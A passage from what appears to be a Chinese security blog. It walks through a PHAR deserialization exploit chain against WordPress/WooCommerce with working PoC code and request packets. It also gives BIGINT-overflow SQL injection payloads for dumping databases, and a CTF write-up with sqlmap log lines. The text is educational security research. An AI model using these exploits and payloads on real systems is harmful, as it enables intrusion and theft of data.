@unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头 $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 采用这种方法可以绕过很大一部分上传检测。 0x03 实际利用 3.1 利用条件 任何漏洞或攻击手法不能实际利用，都是纸上谈兵。在利用之前，先来看一下这种攻击的利用条件。 phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 3.2 wordpress wordpress是网络上最广泛使用的cms，这个漏洞在2017年2月份就报告给了官方，但至今仍未修补。之前的任意文件删除漏洞也是出现在这部分代码中，同样没有修补。根据利用条件，我们先要构造phar文件。 首先寻找能够执行任意代码的类方法： 123456789101112131415wp-includes/Requests/Utility/FilteredIterator.phpclass Requests_Utility_FilteredIterator extends ArrayIterator &#123; /** * Callback to run as a filter * * @var callable */ protected $callback; ... public function current() &#123; $value = parent::current(); $value = call_user_func($this-&gt;callback, $value); // 目的是将callback赋值成危险函数 return $value; &#125;&#125; 这个类继承了ArrayIterator，每当这个类实例化的对象进入foreach被遍历的时候，current()方法就会被调用。下一步要寻找一个内部使用foreach的析构方法，很遗憾wordpress的核心代码中并没有合适的类，只能从插件入手。这里在WooCommerce插件中找到一个能够利用的类： 12345678910111213wp-content/plugins/woocommerce/includes/log-handlers/class-wc-log-handler-file.phpclass WC_Log_Handler_File extends WC_Log_Handler &#123; protected $handles = array(); /*......*/ public function __destruct() &#123; foreach ( $this-&gt;handles as $handle ) &#123; if ( is_resource( $handle ) ) &#123; fclose( $handle ); // @codingStandardsIgnoreLine. &#125; &#125; &#125; /*......*/&#125; 到这里pop链就构造完成了，据此构建phar文件： 1234567891011121314151617181920212223242526&lt;?php class Requests_Utility_FilteredIterator extends ArrayIterator &#123; protected $callback; public function __construct($data, $callback) &#123; parent::__construct($data); $this-&gt;callback = $callback; &#125; &#125; class WC_Log_Handler_File &#123; protected $handles; public function __construct() &#123; $this-&gt;handles = new Requests_Utility_FilteredIterator(array(&#x27;id&#x27;), &#x27;passthru&#x27;); &#125; &#125; @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub, 增加gif文件头，伪造文件类型 $o = new WC_Log_Handler_File(); $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 将后缀名改为gif后，可以在后台上传，也可以通过xmlrpc接口上传，都需要author及以上的权限。记下上传后的文件名和post_ID。 调用顺序: WC_Log_Handler_File中的handle变量赋值为Requests_Utility_FilteredIterator类实例并且赋值上一些危险函数名称和参数 当服务端析构WC_Log_Handler_File时,调用析构函数中的foreach循环,foreach循环依次遍历自身的handle变量 因为此时的handle变量存储的是Requests_Utility_FilteredIterator类实例(经过我们赋值后生成的),这个类实例继承自ArrayIterator,当被foreach调用时,会调用自身的call_user_func函数 调用call_user_func后将自身的变量传入这个函数,自身的变量存储的是我们赋值的危险函数和参数，就会触发。 下面的问题是如何触发反序列化。 接下来我们要找到一个参数可控的文件系统函数： 1234567891011121314151617181920212223wp-includes/post.phpfunction wp_get_attachment_thumb_file( $post_id = 0 ) &#123; $post_id = (int) $post_id; if ( !$post = get_post( $post_id ) ) return false; if ( !is_array( $imagedata = wp_get_attachment_metadata( $post-&gt;ID ) ) ) return false; $file = get_attached_file( $post-&gt;ID ); if ( !empty($imagedata[&#x27;thumb&#x27;]) &amp;&amp; ($thumbfile = str_replace(basename($file), $imagedata[&#x27;thumb&#x27;], $file)) &amp;&amp; file_exists($thumbfile) ) &#123; /** * Filters the attachment thumbnail file path. * * @since 2.1.0 * * @param string $thumbfile File path to the attachment thumbnail. * @param int $post_id Attachment ID. */ return apply_filters( &#x27;wp_get_attachment_thumb_file&#x27;, $thumbfile, $post-&gt;ID ); &#125; return false;&#125; 该函数可以通过XMLRPC调用&quot;wp.getMediaItem&quot;这个方法来访问到，变量$thumbfile传入了file_exists()，正是我们需要的函数，现在我们需要回溯一下$thumbfile变量，看其是否可控。 根据$thumbfile = str_replace(basename($file), $imagedata['thumb'], $file)，如果basename($file)与$file相同的话，那么$thumbfile的值就是$imagedata['thumb']的值。先来看$file是如何获取到的： 1234567891011121314151617181920212223wp-includes/post.phpfunction get_attached_file( $attachment_id, $unfiltered = false ) &#123; $file = get_post_meta( $attachment_id, &#x27;_wp_attached_file&#x27;, true ); // If the file is relative, prepend upload dir. if ( $file &amp;&amp; 0 !== strpos( $file, &#x27;/&#x27; ) &amp;&amp; ! preg_match( &#x27;|^.:\\\\\\|&#x27;, $file ) &amp;&amp; ( ( $uploads = wp_get_upload_dir() ) &amp;&amp; false === $uploads[&#x27;error&#x27;] ) ) &#123; $file = $uploads[&#x27;basedir&#x27;] . &quot;/$file&quot;; &#125; if ( $unfiltered ) &#123; return $file; &#125; /** * Filters the attached file based on the given ID. * * @since 2.1.0 * * @param string $file Path to attached file. * @param int $attachment_id Attachment ID. */ return apply_filters( &#x27;get_attached_file&#x27;, $file, $attachment_id );&#125; 如果$file是类似于windows盘符的路径Z:\\Z，正则匹配就会失败，$file就不会拼接其他东西，此时就可以保证basename($file)与$file相同。 可以通过发送如下数据包来调用设置$file的值： 12345678910111213POST /wordpress/wp-admin/post.php HTTP/1.1Host: 127.0.0.1Content-Length: 147Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/wordpress/wp-admin/post.php?post=10&amp;action=editAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7Cb16569744dd9059a1fafaad1c21cfdbf90fc67aed30e322c9f570b145c3ec516; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7C5c9f11cf65b9a38d65629b40421361a2ef77abe24743de30c984cf69a967e503; wp-settings-time-2=1534912264; XDEBUG_SESSION=PHPSTORMConnection: close_wpnonce=1da6c638f9&amp;_wp_http_referer=%2Fwp-admin%2Fpost.php%3Fpost%3D16%26action%3Dedit&amp;action=editpost&amp;post_type=attachment&amp;post_ID=11&amp;file=Z:\\Z 同样可以通过发送如下数据包来设置$imagedata['thumb']的值： 12345678910111213POST /wordpress/wp-admin/post.php HTTP/1.1Host: 127.0.0.1Content-Length: 184Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/wordpress/wp-admin/post.php?post=10&amp;action=editAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7Cb16569744dd9059a1fafaad1c21cfdbf90fc67aed30e322c9f570b145c3ec516; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=author%7C1535082294%7C1OVF85dkOeM7IAkQQoYcEkOCtV0DWTIrr32TZETYqQb%7C5c9f11cf65b9a38d65629b40421361a2ef77abe24743de30c984cf69a967e503; wp-settings-time-2=1534912264; XDEBUG_SESSION=PHPSTORMConnection: close_wpnonce=1da6c638f9&amp;_wp_http_referer=%2Fwp-admin%2Fpost.php%3Fpost%3D16%26action%3Dedit&amp;action=editattachment&amp;post_ID=11&amp;thumb=phar://./wp-content/uploads/2018/08/phar-1.gif/blah.txt _wpnonce可在修改页面中获取。 最后通过XMLRPC调用&quot;wp.getMediaItem&quot;这个方法来调用wp_get_attachment_thumb_file()函数来触发反序列化。xml调用数据包如下： 12345678910111213141516171819202122232425262728293031323334POST /wordpress/xmlrpc.php HTTP/1.1Host: 127.0.0.1Content-Type: text/xmlCookie: XDEBUG_SESSION=PHPSTORMContent-Length: 529Connection: close&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;methodCall&gt; &lt;methodName&gt;wp.getMediaItem&lt;/methodName&gt; &lt;params&gt; &lt;param&gt; &lt;value&gt; &lt;string&gt;1&lt;/string&gt; &lt;/value&gt; &lt;/param&gt; &lt;param&gt; &lt;value&gt; &lt;string&gt;author&lt;/string&gt; &lt;/value&gt; &lt;/param&gt; &lt;param&gt; &lt;value&gt; &lt;string&gt;you_password&lt;/string&gt; &lt;/value&gt; &lt;/param&gt; &lt;param&gt; &lt;value&gt; &lt;int&gt;11&lt;/int&gt; &lt;/value&gt; &lt;/param&gt; &lt;/params&gt; &lt;/methodCall&gt; 0x04 防御 在文件系统函数的参数可控时，对参数进行严格的过滤。 严格检查上传文件的内容，而不是只检查文件头。 在条件允许的情况下禁用可执行系统命令、代码的危险函数。 0x05 参考链接 https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf http://php.net/manual/en/intro.phar.php http://php.net/manual/en/phar.fileformat.ingredients.php http://php.net/manual/en/phar.fileformat.signature.php https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf"},{"title":"sql注入BIGINT溢出","date":"2019-12-07","updated":"2024-03-19","path":"2019/12/07/sql注入BIGINT溢出/","text":"mysql 5.5.5及以上版本才有溢出错误 查看mysql文档来看看mysql存储数据的范围 11.2.1 Integer Types (Exact Value) - INTEGER, INT, SMALLINT, TINYINT, MEDIUMINT, BIGINT ​ MySQL supports the SQL standard integer types INTEGER (or INT) and SMALLINT. As an extension to the standard, MySQL also supports the integer types TINYINT, MEDIUMINT, and BIGINT. The following table shows the required storage and range for each integer type. Table 11.1 Required Storage and Range for Integer Types Supported by MySQL Type Storage (Bytes) Minimum Value Signed Minimum Value Unsigned Maximum Value Signed Maximum Value Unsigned TINYINT 1 -128 0 127 255 SMALLINT 2 -32768 0 32767 65535 MEDIUMINT 3 -8388608 0 8388607 16777215 INT 4 -2147483648 0 2147483647 4294967295 BIGINT 8 $ 2^63 $ 0 263−12^63 -1263−1 264−12^64 -1264−1 BIGINT的长度为8字节64bit 12&gt;&gt;&gt; 0b01111111111111111111111111111111111111111111111111111111111111119223372036854775807 1234567MariaDB [test]&gt; select 9223372036854775807;+---------------------+| 9223372036854775807 |+---------------------+| 9223372036854775807 |+---------------------+1 row in set (0.000 sec) 对这个数字加减就会产生溢出错误: 12345MariaDB [test]&gt; select 9223372036854775807+1;ERROR 1690 (22003): BIGINT value is out of range in &#x27;9223372036854775807 + 1&#x27;MariaDB [test]&gt; select cast(b&#x27;1111111111111111111111111111111111111111111111111111111111111111&#x27; as unsigned)+1;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;cast(0xffffffffffffffff as unsigned) + 1&#x27; 对0取反就可以得到这个数字 123456789MariaDB [test]&gt; select ~0;+----------------------+| ~0 |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.000 sec)MariaDB [test]&gt; select ~0+1;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;~0 + 1&#x27; 引发注入攻击 mysql 查询成功后会返回0, 取逻辑非变为1 123456789101112131415MariaDB [test]&gt; select (select * from flag);+----------------------------------------+| (select * from flag) |+----------------------------------------+| D0g3&#123;G0ph1er_4nd_55rf_1s_1nt3rest1ng!&#125; |+----------------------------------------+1 row in set (0.000 sec)MariaDB [test]&gt; select !(select * from flag);+-----------------------+| !(select * from flag) |+-----------------------+| 1 |+-----------------------+1 row in set, 1 warning (0.000 sec) 所以思路就是查询的结果加上BIGINT最大值(~0), 如果成功则相当于1+ ~0会产生溢出错误 12MariaDB [test]&gt; select !(select * from flag)+~0;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;!(select #) + ~0&#x27; 如果通过网页传递数据的话,+号会被转化成空格,所以可以替换成下面几种写法: 12345!(select*from(select user())x)-~0(select(!x-~0)from(select(select user())x)a)(select!x-~0.from(select(select user())x)a) 利用这种基于BIGINT溢出错误的注入手法，我们可以几乎可以使用MySQL中所有的数学函数，因为它们也可以进行取反，具体用法如下所示： 123select !atan((select*from(select user())a))-~0; select !ceil((select*from(select user())a))-~0;select !floor((select*from(select user())a))-~0; 下面的我们已经测试过了，如果你愿意的话，还可以找到更多:) 1234567891011HEXINFLOORCEILRANDCEILINGTRUNCATETANSQRTROUNDSIGN 0x003 提取数据 提取数据的方法，跟其他注入攻击手法中的一样，这里只做简单介绍。 首先，我们来获取表名： 1!(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0 取得列名： 1select !(select*from(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)x)-~0; 检索数据： 1!(select*from(select concat_ws(&#x27;:&#x27;,id, username, password) from users limit 0,1)x)-~0; 0x004 一次性转储 我们能够一次性转储所有数据库、列和数据表吗？ 答案是肯定的。但是，当我们从所有数据库中转储数据表和列的时候，只能得到较少的结果，毕竟我们是通过错误消息来检索数据的。 不过，如果我们是从当前数据库中转储数据的话，一次最多可以转储27个结果。下面举例说明。 123!(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0(select(!x-~0)from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)(select!x-~0.from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a) 这些限制了我们可以检索的结果的数量，即最多27个。假设，我们在一个数据库中创建了一个31列的数据表。 那么，我们只能看到27个结果，而我的其他4个表和该用户数据表的其他列都无法返回。 0x05 利用插入语句进行注入 利用插入语句，我们也可以进行类似的注入攻击，具体语法为‘’ or (payload) or “”。 12mysql&gt; insert into users (id, username, password) values (2, &#x27;&#x27; or !(select*from(select user())x)-~0 or &#x27;&#x27;, &#x27;Eyre&#x27;);ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;((not((select &#x27;root@localhost&#x27; from dual))) - ~(0))&#x27; 我们还可以使用DIOS查询。 12345insert into users (id, username, password) values (2, &#x27;&#x27; or !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0 or &#x27;&#x27;, &#x27;Eyre&#x27;);ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;((not((select &#x27;000newdb::users::idnewdb::users::usernamenewdb::users::password&#x27; from dual))) - ~(0))&#x27; 0x06 利用更新语句进行注入 利用更新语句，我们照样可以进行类似的注入，具体如下所示： 12mysql&gt; update users set password=&#x27;Peter&#x27; or !(select*from(select user())x)-~0 or &#x27;&#x27; where id=4;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;((not((select &#x27;root@localhost&#x27; from dual))) - ~(0))&#x27; 0x07 利用更新语句进行注入 同样的，我们也可以利用删除语句进行注入，具体如下所示： 12mysql&gt; delete from users where id=&#x27;1&#x27; or !(select*from(select user())x)-~0 or &#x27;&#x27;;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;((not((select &#x27;root@localhost&#x27; from dual))) - ~(0))&#x27;"},{"title":"2019深思杯","date":"2019-12-05","updated":"2024-03-19","path":"2019/12/05/2019深思杯/","text":"上下左右 flag.txt: 1DDDDDDDDDRRRRRRDDDDDDDDDDDDDDDDLLLDDDDDDDDDDDLLRRRRLLDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRRUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDRRRRRRLDDDDDDDDDDDDDLLLLLLLRRRRRRRRLUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUUURRLLDDDDDDDDDDDDDDDDDDDDDDLLDDDDRRDDDDDDDDDDDDDDDDDDDDDDDRRLLUUUUUUUUUUUUUUUUUUUUUUULLUUUURRUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRDDDDDDDDDDDDDDDDDDDDDDRRRRRLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDRRRUUUUUUUUUUUUUUUURRRRLLLLDDDDDDDDDDDDDDDDRRRRDDDDDDDDDDDDDDDDDDDDDDLLLLRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRUUUUUUUUUUUUUUUUUUUUULLLRRRDDDDDDDDDDDDDDDDDDDDDDDDRRDDDDLLDDDDDDDDDDDDDDDDDDDDLLL crack.py: 1234567891011121314151617181920# encoding: utf-8from PIL import Imageim = Image.new(&#x27;RGB&#x27;,(1000,1000),&#x27;black&#x27;) #把flag中的字母读出来file = open(&#x27;flag.txt&#x27;)line = file.readline()a = [300,300] #起始位置#把flag[0]当做左右移动 flag[1]当做上下移动for i in line: if i == &#x27;D&#x27;: a[1] = a[1]+1 if i == &#x27;U&#x27;: a[1] = a[1]-1 if i == &#x27;R&#x27;: a[0] = a[0]+1 if i == &#x27;L&#x27;: a[0] = a[0]-1 im.putpixel(a ,(255,255,255)) ## putpixel是通过坐标点来进行画图##刚开始是按照惯例 让i == &#x27;u&#x27; +1 画出来是个倒立的图形 所以只能让 ‘D&#x27;+1im.show() ​ 压缩包的秘密 直接打开压缩包 查看16进制: 123456789101112131415161718192021222324250000000 504b 0304 1400 0900 0800 d772 554f 9f430000010 ce46 3400 0000 2600 0000 0800 0000 666c0000020 6167 2e74 7874 1cc2 f91a 0f38 037f 62c90000030 3bf5 1bed 8553 59ca 7052 4df3 257c 8f4b0000040 2ac9 a176 c915 0098 aaef bf55 4f06 e3f30000050 7c7e 43f8 67e7 dbb1 3a81 504b 0708 9f430000060 ce46 3400 0000 2600 0000 504b 0102 1f000000070 1400 0900 0800 d772 554f 9f43 ce46 34000000080 0000 2600 0000 0800 2400 0000 0000 00000000090 2000 0000 0000 0000 666c 6167 2e74 787400000a0 0a00 2000 0000 0000 0100 1800 b944 f3f400000b0 d787 d501 0439 16c2 5185 d501 0439 16c200000c0 5185 d501 504b 0506 0000 0000 0100 010000000d0 5a00 0000 6a00 0000 8000 090d 0a20 202000000e0 200d 0a20 0d0a 2009 200d 0a20 0d0a 092000000f0 2020 2009 0d0a 2020 0d0a 2020 200d 0a090000100 2020 2020 090d 0a20 2020 200d 0a20 090d0000110 0a20 0920 200d 0a20 2009 200d 0a09 20200000120 2020 090d 0a20 0909 200d 0a20 0909 0d0a0000130 0920 200d 0a09 2020 2020 090d 0a20 20200000140 0d0a 0920 200d 0a09 200d 0a20 200d 0a200000150 2020 0d0a 0920 0920 0d0a 6447 686c 636d0000160 5574 6158 4d74 6147 4673 5a69 3177 64320000170 5174 6332 686c 626e 4e70 000017a 发现两个字节位置不对,写脚本交换两字节位置,恢复压缩包 12345678S=&#x27;4B50040300140009000872D74F55439F46CE0034000000260000000800006C666761742E7478C21C1AF9380F7F03C962F53BED1B5385CA595270F34D7C254B8FC92A76A115C99800EFAA55BF064FF3E37E7CF843E767B1DB813A4B500807439F46CE00340000002600004B500201001F00140009000872D74F55439F46CE00340000002600000008002400000000000000200000000000006C666761742E7478000A0020000000000001001844B9F4F387D701D53904C216855101D53904C216855101D54B5006050000000000010001005A0000006A000000800D09200A20200D20200A0A0D09200D20200A0A0D2009202009200A0D20200A0D20200D20090A202020200D09200A20200D20200A0D09200A20090D20200A09200D20090A202020200D09200A09090D20200A09090A0D20090D20090A202020200D09200A20200A0D20090D20090A0D20200A0D20200A20200A0D200920090A0D47646C686D6374555861744D47617346695A77313264745132636C686E62704E&#x27;s1=&#x27;&#x27;for i in range(int(len(S)/4)): s1+=S[4*i+2] s1+=S[4*i+3] s1+=S[4*i] s1+=S[4*i+1]print(s1) 解压压缩包发现里面有一个加密的flag.txt 在查看16进制，发现底部有base64编码，解码后提示一半的密码，shensi，不过这一半的密码… 是后6位密码，并不是前6位（巨坑！），接下来可以掩码爆破，也可以猜测出来…密码:sdniscshensi flag&#123;5b3fcbb6920490bf4ab156df51c0976c&#125; 我和我的祖国 音频分析发现信息隐藏在最后 下面的是0，上面是1 查看16进制: F0D8 --&gt; 1 1027 --&gt; 0 解题脚本: 12345678910111213141516171819202122232425262728# encoding= utf-8f=open(&#x27;flag.wav&#x27;,&#x27;rb+&#x27;)data=f.read()print type(data)strflag=&quot;&quot;flag=&quot;&quot;#w=open(&#x27;flag01.txt&#x27;,&#x27;w&#x27;)#w.write(&#x27;0&#x27;)# 0x362e4c为隐藏信息的开头偏移地址for i in range(0x362e4c,len(data),2): if data[i]==&#x27;\\xf0&#x27;: strflag+=&#x27;0&#x27; #print 0 #w.write(&#x27;0&#x27;) elif data[i]==&#x27;\\x10&#x27;: strflag+=&#x27;1&#x27; #print 1 #w.write(&#x27;1&#x27;) f.close()#w.close()print strflagfor i in range(0,len(strflag),8): chra=int(strflag[i:i+8],2) flag+=chr(chra)print flag Forensic-日志分析 123456789101112192.168.117.1 - - [08/Oct/2019:14:02:12 +0800] &quot;GET /admin/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E96%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1&quot; 200 209 &quot;-&quot; &quot;sqlmap/1.3.10.7#dev (http://sqlmap.org)&quot;192.168.117.1 - - [08/Oct/2019:14:02:12 +0800] &quot;GET /admin/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E112%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1&quot; 200 215 &quot;-&quot; &quot;sqlmap/1.3.10.7#dev (http://sqlmap.org)&quot;192.168.117.1 - - [08/Oct/2019:14:02:12 +0800] &quot;GET /admin/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E104%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1&quot; 200 215 &quot;-&quot; &quot;sqlmap/1.3.10.7#dev (http://sqlmap.org)&quot;192.168.117.1 - - [08/Oct/2019:14:02:12 +0800] &quot;GET /admin/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E100%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1&quot; 200 209 &quot;-&quot; &quot;sqlmap/1.3.10.7#dev (http://sqlmap.org)&quot;192.168.117.1 - - [08/Oct/2019:14:02:12 +0800] &quot;GET /admin/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E102%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1&quot; 200 215 &quot;-&quot; &quot;sqlmap/1.3.10.7#dev (http://sqlmap.org)&quot;192.168.117.1 - - [08/Oct/2019:14:02:12 +0800] &quot;GET /admin/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E101%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1&quot; 200 209 &quot;-&quot; &quot;sqlmap/1.3.10.7#dev (http://sqlmap.org)&quot;192.168.117.1 - - [08/Oct/2019:14:02:12 +0800] &quot;GET /admin/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E96%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1&quot; 200 209 &quot;-&quot; &quot;sqlmap/1.3.10.7#dev (http://sqlmap.org)&quot;192.168.117.1 - - [08/Oct/2019:14:02:12 +0800] &quot;GET /admin/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E112%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1&quot; 200 215 &quot;-&quot; &quot;sqlmap/1.3.10.7#dev (http://sqlmap.org)&quot;192.168.117.1 - - [08/Oct/2019:14:02:12 +0800] &quot;GET /admin/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E104%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1&quot; 200 209 &quot;-&quot; &quot;sqlmap/1.3.10.7#dev (http://sqlmap.org)&quot;192.168.117.1 - - [08/Oct/2019:14:02:12 +0800] &quot;GET /admin/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E108%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1&quot; 200 215 &quot;-&quot; &quot;sqlmap/1.3.10.7#dev (http://sqlmap.org)&quot;192.168.117.1 - - [08/Oct/2019:14:02:12 +0800] &quot;GET /admin/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E106%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1&quot; 200 209 &quot;-&quot; &quot;sqlmap/1.3.10.7#dev (http://sqlmap.org)&quot;192.168.117.1 - - [08/Oct/2019:14:02:12 +0800] &quot;GET /admin/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E107%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1&quot; 200 209 &quot;-&quot; &quot;sqlmap/1.3.10.7#dev (http://sqlmap.org)&quot; 二分注入 简单的密码 hellO，everyone Are YOU huNGrY woUld you like To eAt BAcon 培根密码 有两种解密模式: 小写字母转为a , 大写字母转为b 小写字母转为A , 大写字母转为B 123456789101112131415161718192021222324#encoding=utf-8import reraw=&quot;hellOeveryoneAreYOUhuNGrYwoUldyoulikeToeAtBAcon&quot;print(raw)print &#x27;小写字母转为a , 大写字母转为b: &#x27;To_a=re.sub(r&#x27;[a-z]&#x27;,&#x27;a&#x27;,raw)To_b=re.sub(r&#x27;[A-Z]&#x27;,&#x27;b&#x27;,To_a)print(To_b)print &#x27;小写字母转为A , 